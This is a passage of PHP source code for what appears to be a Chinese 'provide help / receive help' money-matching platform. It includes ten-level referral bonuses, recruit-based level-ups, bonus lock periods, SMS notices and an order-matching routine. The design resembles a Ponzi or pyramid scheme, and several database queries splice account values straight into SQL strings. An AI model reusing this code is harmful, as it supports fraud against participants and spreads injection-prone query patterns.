            $record3 ["UG_dataType"] = 'jlj'; // 金幣轉出
            $record3 ["UG_note"] = $note; // 推薦獎說明
            $record3["UG_getTime"] = date('Y-m-d H:i:s', time()); //操作時間
            $reg4 = M('userget')->add($record3);
    }
}
//===end
//--------------jsj4和jlj5计算的是待定的 先被取消
// 第一个参数 提供帮助人 第二参数是帮助金额              ----------------------》经分析此函数多次计算直接推荐人的经理代数奖
function lkdsjfsdfj($p_user, $jb)
{

    $ppddxx['p_user'] = $p_user; //提供帮助人
    $ppddxx['jb'] = $jb; //第二参数是帮助金额
    //经理奖金订单
    $tgbz_user_xx = M('user')->where(array('UE_account' => $ppddxx['p_user']))->find();//提供帮助人详细
    jlj4($tgbz_user_xx['ue_accname'], $ppddxx['jb'] * 0.1);

    if ($tgbz_user_xx['zcr'] <> '') {
        $zcr2 = jlj5($tgbz_user_xx['zcr'], $ppddxx['jb'] * 0.05);
        if ($zcr2 <> '') {
            $zcr3 = jlj5($zcr2, $ppddxx['jb'] * 0.03);
            //echo $ppddxx['p_user'].'sadfsaf';die;
            if ($zcr3 <> '') {
                $zcr4 = jlj5($zcr3, $ppddxx['jb'] * 0.01);
                if ($zcr4 <> '') {
                    $zcr5 = jlj5($zcr4, $ppddxx['jb'] * 0.005);
                    if ($zcr5 <> '') {
                        $zcr6 = jlj5($zcr5, $ppddxx['jb'] * 0.003);
                        if ($zcr6 <> '') {
                            $zcr7 = jlj5($zcr6, $ppddxx['jb'] * 0.001);
                            if ($zcr7 <> '') {
                                $zcr8 = jlj5($zcr7, $ppddxx['jb'] * 0.0005);
                                if ($zcr8 <> '') {
                                    $zcr9 = jlj5($zcr8, $ppddxx['jb'] * 0.0003);

                                    if ($zcr9 <> '') {
                                        jlj5($zcr9, $ppddxx['jb'] * 0.0001);


                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    //经理奖金订单

}

function fh($content,$append=false){
    if($append)
        file_put_contents('./test.txt', var_export($content,true),FILE_APPEND);
    else
        file_put_contents('./test.txt', var_export($content,true));
}




/*--------------------------------
功能:     HTTP接口 发送短信
修改日期:   2011-03-04
说明:     http://api.sms.cn/mt/?uid=用户账号&pwd=MD5位32密码&mobile=号码&mobileids=号码编号&content=内容
状态:
    100 发送成功
    101 验证失败
    102 短信不足
    103 操作失败
    104 非法字符
    105 内容过多
    106 号码过多
    107 频率过快
    108 号码内容空
    109 账号冻结
    110 禁止频繁单条发送
    112 号码不正确
    120 系统升级
--------------------------------*/

//echo 111;
function sendSMS($mobile,$content,$mobileids='',$http='http://api.sms.cn/mtutf8/'){
    $uid = C('mobile_account');
    $pwd = C('mobile_password');
    return send($http,$uid,$pwd,$mobile,$content,$mobileids);

}

function send($http,$uid,$pwd,$mobile,$content,$mobileids,$time='',$mid='')
{

    $data = array(
        'uid'=> $uid,                   //用户账号
        'pwd'=>md5($pwd.$uid),          //MD5位32密码,密码和用户名拼接字符
        'mobile'=>$mobile,              //号码
        'content'=>"【2016人均财富】".$content,            //内容
        'mobileids'=>$mobileids,
        'time'=>$time,                  //定时发送
        );
    $re= postSMS($http,$data);          //POST方式提交
    file_put_contents("sms.txt", $re.$content);
    return $re;
}

function postSMS($url,$data='')
{
    $port="";
    $post="";
    $row = parse_url($url);
    $host = $row['host'];
    $port = $row['port'] ? $row['port']:80;
    $file = $row['path'];
    while (list($k,$v) = each($data))
    {
        $post .= rawurlencode($k)."=".rawurlencode($v)."&"; //转URL标准码
    }
    $post = substr( $post , 0 , -1 );
    $len = strlen($post);
    $fp = @fsockopen( $host ,$port, $errno, $errstr, 10);
    if (!$fp) {
        return "$errstr ($errno)\n";
    } else {
        $receive = '';
        $out = "POST $file HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "Content-type: application/x-www-form-urlencoded\r\n";
        $out .= "Connection: Close\r\n";
        $out .= "Content-Length: $len\r\n\r\n";
        $out .= $post;
        fwrite($fp, $out);
        while (!feof($fp)) {
            $receive .= fgets($fp, 128);
        }
        fclose($fp);
        $receive = explode("\r\n\r\n",$receive);
        unset($receive[0]);
        return implode("",$receive);
    }
}

/**
 * 自动升级
 */
function AutoUpdate($userinfo){
    $user = M('user');
    $b1 = $user->where("UE_accName='".$userinfo['ue_account']."' And UE_level=1")->count();
    $b2 = $user->where("UE_accName='".$userinfo['ue_account']."' And UE_level=2")->count();
    $b3 = $user->where("UE_accName='".$userinfo['ue_account']."' And UE_level=3")->count();
    $b4 = $user->where("UE_accName='".$userinfo['ue_account']."' And UE_level=4")->count();
    $b5 = $user->where("UE_accName='".$userinfo['ue_account']."' And UE_level=5")->count();
    $b6 = $user->where("UE_accName='".$userinfo['ue_account']."' And UE_level=6")->count();
    $level = 0;
    $levelname = 'B1';
    if($b1>=C('uplv2')){
        $level = 2;
        $levelname = 'B2';
    }
    if($b1>=C('uplv3')){//2016-06-11$b2改为$b1
        $level = 3;
        $levelname = 'B3';
    }
    /*if($b3>=C('uplv4')){
        $level = 4;
        $levelname = 'B4';
    }
    if($b4>=C('uplv5')){
        $level = 5;
        $levelname = 'B5';
    }
    if($b5>=C('uplv6')){
        $level = 6;
        $levelname = 'B6';
    }*/
    if($b1>=C('uplv7')){//2016-06-11$b6改为$b1
        $level = 7;
        $levelname = '经理';
    }
    if($level<=$userinfo['ue_level']){
        return;
    }
    $user->where("UE_account='".$userinfo['ue_account']."'")->save(array('UE_level'=>$level,'levelname'=>$levelname));
}

function AutoTeam($userinfo){
    $node = C('tdnode');
    $fee = C('tdfee');
    $nodel = explode(",",$node);
    $feel = explode(",",$fee);
    foreach($nodel as $k=>$v){
        //echo $feel[$k];
        if($userinfo['tdnode']<($k+1) && $userinfo['tj_num']>=$nodel[$k]){
            //echo "要拿".$v;
            $money = $feel[$k];
            //M('user')->where(array('UE_account'=>$userinfo['ue_account']))->setInc('jl_he',$money);
            //获取推荐人的详细信息
            $note3 = "团队奖";
            $record3 ["user"] = $userinfo['ue_account']; // 登入转出账户  提供帮助的推荐人
            $record3 ["jb"] = $money;
            $record3 ["jj"] = $money;
            $record3 ["zt"] = 0;
            $record3 ["r_id"] = 0;
            $record3 ["note"] = $note3;
            $record3 ["ds"] = "团队奖";
            $record3["date"] = date ( 'Y-m-d H:i:s', time () ); //操作时间
            $reg4 = M('user_jl')->add($record3);
            M('user')->where("UE_account='".$userinfo['ue_account']."'")->setField('tdnode',$k+1);
        }
    }
}

function zhuangtai($id){
    $ob = M('user_jl')->where("id={$id}")->find();
    if($ob['zt']){
        return "已发放";
    }
    $etime = 0;
    if($ob['note']=='团队奖'){
        $etime = C('tdlock');
    }else if($ob['note']=='新用户注册奖'){
        $etime = C('reg_jiangli_dongjie');
    }else if($ob['note']=='直推奖'){
        $etime = C('zhituijiang_dongjie');
    }
    if($ob['ds']=='动态奖'){
        $etime = C('dtlock');
    }
    $locktime = strtotime($ob['date'])+$etime*3600*24;
    if($locktime>time()){
        return "<font color='red'>冻结中 到期时间：".date("Y-m-d H:i",$locktime)."</font>";
    }else{
        return "<a href='".U('Info/txtdj',array('id'=>$id))."'>提现转出</a>";
    }
}

//当前用户派单总额度
function get_pai_zong_edu(){
    $User = M("User");
    $user_name = $_SESSION['uname'];

    $paidan_jbs = C("paidan_jbs");  //每天用户提供帮助排单总额度
    $month_max = C("month_max");    //用户提供帮助月投资额度封顶
    $zhiti_tianjia = C("zhiti_tianjia");    //每发展一个直推增加额度


    //直推人数
    $map = array();
    $map['UE_accName'] = $user_name;
    $zhitui_num = $User->where( $map )->count();

    $pai_zong_edu = $paidan_jbs+($zhitui_num*$zhiti_tianjia);
    return $pai_zong_edu;
}

// 当前用户可以总额度
function get_pai_keyong_edu(){
    $Tgbz = M("Tgbz");
    $user_name = $_SESSION['uname'];

    $pai_zong_edu = get_pai_zong_edu();

    //正在派单中的金额总和
    $map = array();
    $map['zt'] = array('lt',2);
    $map['user'] = $user_name;
    $pai_in = $Tgbz->where( $map )->sum('jb');

    $pai_keyong_edu = $pai_zong_edu-$pai_in;
    return $pai_keyong_edu;
}

//超时自动匹配
function tgbz_automatch($tgbz_list=array()){
    $zidongpipei = C('zidongpipei');    //自动匹配超时时间 单位小时
    if($zidongpipei<=0) return false;
    $Tgbz = M('Tgbz');

    $end_time_pipei = NOW_TIME-($zidongpipei*3600);
    $map = array();

    $map['date'] = array('lt',date('Y-m-d H:i:s',$end_time_pipei));
    $map['zt'] = 0;
    $tgbz_automatch_list = $Tgbz->where($map)->select();
    if(empty($tgbz_automatch_list)) return false;
    //G('begin');


    $jsbz_list=M('jsbz')->where(array('zt'=>0))->order('date asc')->order('date asc')->limit(10)->select();
    //要匹配的的额度
    $jsbz_total=M('jsbz')->where(array('zt'=>0))->field('sum(jb) as jb')->order('date asc')->limit(10)->find();
    //查询今天已经匹配的订单
    $sdate = date("Y-m-d 00:00:00");
    $edate = date("Y-m-d 23:59:59");
    $ppdd=M('ppdd')->where("`date` between '$sdate' AND '$edate'")->group('p_user')->field('sum(jb) as jb,p_user,p_id,date,g_id')->select();

    //预处理匹配数据
    foreach($ppdd as $v){
        $pp_arr[]=array(
            'jb' => $v['jb'],
            'p_user' => $v['p_user'],
        );
    }

    //存放今天有拆单的用户
    $cd_user=array();
    //提供帮助新容器
    $tgbz_list=array();
    $tgbz_total=0;

    //清除已经匹配过的
    foreach($tgbz_automatch_list as $k=>$v){
        if($tgbz_total<=$jsbz_total['jb']){

            $tgbs_unset=false;

            if($v['old_pid']>0){                        //查看是否有拆单，如果有，屏蔽所有没拆弹的
                $cd_user[]=$v['user'];
            }else{
                //用户有拆单或金额相等不匹配
                foreach($ppdd as $pval){
                    if(($v['user']==$pval['p_user'] && $pval['jb']>=$v['jb']) || in_array($v['user'],$cd_user)){
                        $tgbs_unset=true;
                    }
                }
            }

            if(!$tgbs_unset){
                $tgbz_list[$k]=$v;
                $tgbz_total=$tgbz_total+$v['jb'];
            }
        }
    }
    /*print_r($cd_user);
    unset($cd_user,$tgbz_automatch_list);
    print_r($tgbz_list);
    die;*/
    $pipeits = 0;       // 匹配数量
    $list;              // 匹配好的列表

    $intgbzidarr=array();       // 匹配上的提供帮助id
    $injsbzidarr=array();       // 匹配上的获得帮助id

    /*
     *  开启数据库事务防止数据丢失
     */

    $ppdd_Model=M('ppdd');
    $tgbz_Model=M('tgbz');
    $jsbz_Model=M('jsbz');
    $tgbz_Model->startTrans();
    $jsbz_Model->startTrans();
    $ppdd_Model->startTrans();

    //匹配等值的数据
    foreach($tgbz_list as $tgbz){
        foreach($jsbz_list as $jsbz){
            //直接匹配
            if ($tgbz['jb'] == $jsbz['jb'] && $tgbz['user'] <> $jsbz['user']
                 && !in_array($tgbz["id"], $intgbzidarr) &&  !in_array($jsbz["id"], $injsbzidarr)) {
                $pipeits++;
                $list[] = array("index"=> count($list) + 1, "tgbz" => array($tgbz), "jsbz" => array($jsbz));

                $intgbzidarr[] = $tgbz["id"];
                $injsbzidarr[] = $jsbz["id"];

                break;
            }

            //提供帮助小于获得帮助 金额相等的 直接匹配
            /*if ($tgbz['jb'] < $jsbz['jb'] && $tgbz['user'] <> $jsbz['user']
                && !in_array($tgbz["id"], $intgbzidarr) &&  !in_array($jsbz["id"], $injsbzidarr)) {

                $tgjsca = $jsbz['jb'] - $tgbz['jb'];
                $tmptgbzarr[] = $tgbz;   // 临时提供帮助 加一起可以匹配一个获得帮助
                $tmptgjscaidarr[] = $tgbz["id"];

                while($tgjsca > 0 && $windex ++ < 10) {
                    foreach ($tgbz_list as $tgbz2 )  {
                        if ($tgjsca == $tgbz2['jb'] && $jsbz['user'] <> $tgbz2['user']
                            && !in_array($tgbz2["id"], $tmptgjscaidarr)
                            && !in_array($tgbz2["id"], $intgbzidarr)  && !in_array($jsbz["id"], $injsbzidarr) ) {

                            $tmptgbzarr[] = $tgbz2;
                            $pipeits++;
                            $tgjsca = 0;

                            $list[] = array("index"=> count($list) + 1, "tgbz" => $tmptgbzarr, "jsbz" => array($jsbz));
                            $injsbzidarr[] = $jsbz["id"];

                            foreach($tmptgbzarr as $tgbz3)
                                $intgbzidarr[] = $tgbz3["id"];
                            break;
                        }

                        if ($tgbz2['jb'] < $tgjsca && $tgbz2['user'] <> $jsbz['user']
                            && !in_array($tgbz2["id"], $tmptgjscaidarr)
                            &&  !in_array($tgbz2["id"], $intgbzidarr)  && !in_array($jsbz["id"], $injsbzidarr) ) {

                            $tgjsca = $tgjsca - $tgbz2['jb'];
                            $tmptgbzarr[] = $tgbz2;
                            $tmptgjscaidarr[] = $tgbz2["id"];
                         }
                    }
                }
                $tgjsca = 0;
                $windex = 0;
                $tmptgjscaidarr = array();
                $tmptgbzarr = array();
            }*/

            // 提供帮助大于获得帮助 金额相等的 直接匹配
            if ($tgbz['jb'] > $jsbz['jb'] && $tgbz['user'] <> $jsbz['user']
                && !in_array($tgbz["id"], $intgbzidarr) &&  !in_array($jsbz["id"], $injsbzidarr)) {

                $tgjsca = $tgbz['jb'] - $jsbz['jb'];
                $tmpjsbzarr[] = $jsbz; // 临时获得帮助 加一起可以匹配一个获得帮助
                $tmptgjscaidarr[] = $jsbz["id"];

                while($tgjsca > 0 && $windex ++ < 10) {
                    foreach($jsbz_list as $jsbz2 )  {
                        if ($tgjsca == $jsbz2['jb'] && $jsbz2['user'] <> $tgbz['user']
                            && !in_array($jsbz2["id"], $tmptgjscaidarr)
                            && !in_array($tgbz["id"], $intgbzidarr)  && !in_array($jsbz2["id"], $injsbzidarr) ) {

                            $tmpjsbzarr[] = $jsbz2;
                            $pipeits++;
                            $tgjsca = 0;

                            $list[] = array("index"=> count($list) + 1, "tgbz" => array($tgbz), "jsbz" => $tmpjsbzarr);
                            $intgbzidarr[] = $tgbz["id"];

                            foreach($tmpjsbzarr as $jsbz3)
                                $injsbzidarr[] = $jsbz3["id"];
                            break;
                        }

                        if ($tgjsca > $jsbz2['jb'] && $tgbz['user'] <> $jsbz2['user']
                            && !in_array($jsbz2["id"], $tmptgjscaidarr)
                            &&  !in_array($tgbz["id"], $intgbzidarr)  && !in_array($jsbz2["id"], $injsbzidarr) ) {

                            $tgjsca = $tgjsca - $jsbz2['jb'];
                            $tmpjsbzarr[] = $jsbz2;
                            $tmptgjscaidarr[] = $jsbz2["id"];
                         }
                    }
                }

                $tgjsca = 0;
                $windex = 0;
                $tmptgjscaidarr = array();
                $tmpjsbzarr = array();
            }
        }
    }

    //###

    foreach ($tgbz_list as $tgzbkey => $tgbz)  {
        foreach ($jsbz_list as $jsbzkey => $jsbz) {

            // 提供帮助大于获得帮助 金额相等的 拆分匹配
            if ($tgbz['jb'] >= $jsbz['jb'] && $tgbz['user'] <> $jsbz['user']
                && !in_array($tgbz["id"], $intgbzidarr) &&  !in_array($jsbz["id"], $injsbzidarr)) {

                $tgbz['jb2'] = $tgbz['jb'] - $jsbz['jb'];
                $tgbz_list[$tgzbkey]['jb2'] = $tgbz['jb'] - $jsbz['jb'];
                $pipeits++;

                $list[] = array("index"=> count($list) + 1, "tgbz" => array($tgbz), "jsbz" => array($jsbz));
                $injsbzidarr[] = $jsbz["id"];

                foreach ($jsbz_list as $jsbz2)  {
                    if ($tgbz['jb2'] >= $jsbz2['jb'] && $tgbz['user'] <> $jsbz2['user']
                        && !in_array($tgbz["id"], $intgbzidarr) &&  !in_array($jsbz2["id"], $injsbzidarr)) {

                        $tgbz['jb2'] = $tgbz['jb2'] - $jsbz2['jb'];
                        $tgbz_list[$tgzbkey]['jb2'] = $tgbz['jb'] - $jsbz2['jb'];
                        $pipeits++;

                        $list[] = array("index"=> count($list) + 1, "tgbz" => array($tgbz), "jsbz" => array($jsbz2));
                        $injsbzidarr[] = $jsbz2["id"];
                    }
                }

                $intgbzidarr[] = $tgbz["id"];

                break;
             }

            // 提供帮助小于获得帮助 金额相等的 拆分匹配
            if ($tgbz['jb'] <= $jsbz['jb'] && $tgbz['user'] <> $jsbz['user']
                && !in_array($tgbz["id"], $intgbzidarr) &&  !in_array($jsbz["id"], $injsbzidarr)) {
                $jsbz['jb2'] = $jsbz['jb'] - $tgbz['jb'];
                $jsbz_list[$jsbzkey]['jb2'] = $jsbz['jb2'];

                $pipeits++;

                $list[] = array("index"=> count($list) + 1, "tgbz" => array($tgbz), "jsbz" => array($jsbz));

                $intgbzidarr[] = $tgbz["id"];

                foreach ($tgbz_list as $tgbz2)  {
                    if ($tgbz2['jb'] <= $jsbz['jb2'] && $tgbz2['user'] <> $jsbz['user']
                        && !in_array($tgbz2["id"], $intgbzidarr) &&  !in_array($jsbz["id"], $injsbzidarr)) {

                        $jsbz['jb2'] = $jsbz['jb2'] - $tgbz2['jb'];
                        $jsbz_list[$jsbzkey]['jb2'] = $jsbz['jb2'];
                        $pipeits++;

                        $list[] = array("index"=> count($list) + 1, "tgbz" => array($tgbz2), "jsbz" => array($jsbz));

                        $intgbzidarr[] = $tgbz2["id"];
                    }
                }

                $injsbzidarr[] = $jsbz["id"];

                break;
            }

        }
    }//###


    /*开始匹配*/
    $pipeitsok = 0;
    $pipeitsok2 = 0;
    $tmpchgtgbzidarr;
    $tmpchgjsbzidarr;

    foreach($list as $var) {
        $tgbzarr = $var["tgbz"];
        $jsbzarr = $var["jsbz"];
        if(count($tgbzarr) >= 1 && count($jsbzarr) >= 1) {
            $tgbz = $tgbzarr[0];
            $jsbz = $jsbzarr[0];

            //拆分提供帮助
            if(isset($tgbz["jb2"]) && !in_array($tgbz["id"], $tmpchgtgbzidarr)) {

                $tmpchgtgbzidarr[] = $tgbz["id"];
                $tgbzjb = $tgbz["jb"];

                $tmptgbzarr = array();

                foreach($list as $var2) {
                    $tgbzarr2 = $var2["tgbz"];
                    $jsbzarr2 = $var2["jsbz"];

                    if(count($jsbzarr2) == 1 && count($tgbzarr2) == 1) {
                        $tgbz2 = $tgbzarr2[0];

                        if($tgbz2["id"] == $tgbz["id"]) {
                            $tmptgbzarr[] =     $jsbzarr2[0];
                        }
                    }
                }

                $caifensum = 0;

                $arrdata2idarr = array();
                foreach($tmptgbzarr as $jsbz3 ) {

                    $value = $jsbz3["jb"];
                    $caifensum += $value;

                    $data2['zffs1'] = $tgbz['zffs1'];
                    $data2['zffs2'] = $tgbz['zffs2'];
                    $data2['zffs3'] = $tgbz['zffs3'];
                    $data2['user'] = $tgbz['user'];
                    $data2['jb'] = $value;
                    $data2['user_nc'] = $tgbz['user_nc'];
                    $data2['user_tjr'] = $tgbz['user_tjr'];
                    $data2['date'] = $tgbz['date'];
                    $data2['zt'] = $tgbz['zt'];
                    $data2['qr_zt'] = $tgbz['qr_zt'];
                    $data2['old_pid'] = $tgbz['old_pid']== 0 ? $tgbz['id'] : $tgbz['old_pid'];
                    $data2id =  M('tgbz')->add($data2);
                    if ( ppdd_add( $data2id, $jsbz3['id'])) {
                        $pipeitsok++;
                        M('tgbz')->where(array('id' => $data2id))->save(array('cf_ds' => '1'));
                    }
                }

                if($tgbzjb - $caifensum > 0) {

                    $data2['zffs1'] = $tgbz['zffs1'];
                    $data2['zffs2'] = $tgbz['zffs2'];
                    $data2['zffs3'] = $tgbz['zffs3'];
                    $data2['user'] = $tgbz['user'];
                    $data2['jb'] = $tgbzjb - $caifensum;
                    $data2['user_nc'] = $tgbz['user_nc'];
                    $data2['user_tjr'] = $tgbz['user_tjr'];
                    $data2['date'] = $tgbz['date'];
                    $data2['zt'] = $tgbz['zt'];
                    $data2['qr_zt'] = $tgbz['qr_zt'];
                    $data2['old_pid'] = $tgbz['old_pid']== 0 ? $tgbz['id'] : $tgbz['old_pid'];
                    $data2id =  M('tgbz')->add($data2);
                }

                M('tgbz')->where(array('id' => $tgbz['id']))->delete();

            //拆分得到帮助
            }else if(isset($jsbz["jb2"]) && !in_array($jsbz["id"], $tmpchgjsbzidarr)) {

                $tmpchgjsbzidarr[] = $jsbz["id"];
                $jsbzjb = $jsbz["jb"];

                $tmpjsbzarr = array();
                foreach($list as $var3) {
                    $tgbzarr3 = $var3["tgbz"];
                    $jsbzarr3 = $var3["jsbz"];

                    if(count($jsbzarr3) == 1 && count($tgbzarr3) == 1) {
                        $jsbz3 = $jsbzarr3[0];

                        if($jsbz3["id"] == $jsbz["id"]) {
                            $tmpjsbzarr[] =     $tgbzarr3[0];
                        }
                    }
                }

                $caifensum = 0;
                foreach($tmpjsbzarr as $tgbz3 ) {

                    $value = $tgbz3["jb"];
                    $caifensum += $value;

                    $data2['zffs1'] = $jsbz['zffs1'];
                    $data2['zffs2'] = $jsbz['zffs2'];
                    $data2['zffs3'] = $jsbz['zffs3'];
                    $data2['user'] = $jsbz['user'];
                    $data2['jb'] = $value;
                    $data2['user_nc'] = $jsbz['user_nc'];
                    $data2['user_tjr'] = $jsbz['user_tjr'];
                    $data2['date'] = $jsbz['date'];
                    $data2['zt'] = $jsbz['zt'];
                    $data2['qr_zt'] = $jsbz['qr_zt'];
                    $data2['old_gid'] = $jsbz['old_pid']== 0 ? $jsbz['id'] : $jsbz['old_gid'];
                    $data2id = M('jsbz')->add($data2);
                    if (ppdd_add( $tgbz3['id'] , $data2id)) {
                        $pipeitsok++;
                        M('tgbz')->where(array('id' => $tgbz3['id']))->save(array('cf_ds' => '1'));
                    }
                }

                if($jsbzjb - $caifensum > 0) {

                    $data2['zffs1'] = $jsbz['zffs1'];
                    $data2['zffs2'] = $jsbz['zffs2'];
                    $data2['zffs3'] = $jsbz['zffs3'];
                    $data2['user'] = $jsbz['user'];
                    $data2['jb'] = $jsbzjb - $caifensum;
                    $data2['user_nc'] = $jsbz['user_nc'];
                    $data2['user_tjr'] = $jsbz['user_tjr'];
                    $data2['date'] = $jsbz['date'];
                    $data2['zt'] = $jsbz['zt'];
                    $data2['qr_zt'] = $jsbz['qr_zt'];
                    $data2['old_gid'] = $jsbz['old_pid']== 0 ? $jsbz['id'] : $jsbz['old_gid'];
                    $data2id = M('jsbz')->add($data2);
                }

                M('jsbz')->where(array('id' => $jsbz['id']))->delete();

            }else if(!isset($tgbz["jb2"]) && !isset($jsbz["jb2"]))  {
                //一对一
                if(count($tgbzarr) == 1 && count($jsbzarr) == 1) {
                    $tgbz = $tgbzarr[0];
                    $jsbz = $jsbzarr[0];
                    if (ppdd_add( $tgbz['id'], $jsbz['id'])) {
                        $pipeitsok++;
                        M('tgbz')->where(array('id' => $tgbz['id']))->save(array('cf_ds' => '1'));
                    }
                }
                //一对多
                if(count($tgbzarr) == 1 && count($jsbzarr) > 1) {
                    $tgbz = $tgbzarr[0];
                    foreach($jsbzarr as $jsbz) {
                        if (ppdd_add( $tgbz['id'], $jsbz['id'])) {
                            $pipeitsok++;
                            M('tgbz')->where(array('id' => $tgbz['id']))->save(array('cf_ds' => '1'));
                        }
                    }
                //多对一
                }else if(count($tgbzarr) > 1 && count($jsbzarr) == 1) {
                    $jsbz = $jsbzarr[0];
                    foreach($tgbzarr as $tgbz) {
                        if (ppdd_add2( $tgbz['id'], $jsbz['id'])) {
                            $pipeitsok++;
                            M('tgbz')->where(array('id' => $tgbz['id']))->save(array('cf_ds' => '1','old_pid'=>$tgbz['id']));
                            M('jsbz')->where(array('id' => $jsbz['id']))->save(array('old_gid'=>$jsbz['id']));
                        }
                    }
                }

            }else if(count($tgbzarr) == 1 && count($jsbzarr) > 1) {
                $tgbz = $tgbzarr[0];
                foreach($jsbzarr as $jsbz) {
                    if (ppdd_add2( $tgbz['id'], $jsbz['id'])) {
                        $pipeitsok++;
                    }
                }

            }else if(count($tgbzarr) > 1 && count($jsbzarr) == 1) {
                $jsbz = $jsbzarr[0];
                foreach($tgbzarr as $tgbz) {
                    if (ppdd_add2( $tgbz['id'], $jsbz['id'])) {
                        $pipeitsok++;
                    }
                }
            }
        }
    }

    //请求发送短息通知
    //update_send_sms();

    $tgbz_Model->commit();
    $jsbz_Model->commit();
    $ppdd_Model->commit();

}